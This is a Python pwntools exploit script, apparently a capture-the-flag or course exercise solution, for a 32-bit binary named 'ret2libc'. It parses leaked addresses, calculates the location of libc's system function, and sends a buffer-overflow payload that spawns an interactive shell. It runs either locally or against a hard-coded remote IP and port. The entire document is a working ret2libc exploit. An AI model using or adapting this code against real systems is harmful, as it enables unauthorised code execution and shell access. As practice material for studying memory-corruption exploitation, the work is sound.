from pwn import *
from LibcSearcher import *
ret2libc = ELF('./ret2libc')
if args['REMOTE']:
    sh = remote('140.113.209.24', 11002)
    libc = ELF('./libc.so.6')
else:
    sh = process('./ret2libc')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
system_offest = libc.symbols['system']
puts_offest = libc.symbols['puts']
sh.recvuntil('is ')
sh_addr = int(sh.recvuntil('\n', drop=True), 16)
print hex(sh_addr)
sh.recvuntil('is ')
puts_addr = int(sh.recvuntil('\n', drop=True), 16)
print hex(puts_addr)
system_addr = puts_addr - puts_offest + system_offest
payload = flat([0x1c * 'a', 'bbbb', system_addr, 'bbbb', sh_addr])
#gdb.attach(sh)
sh.sendline(payload)
sh.interactive()
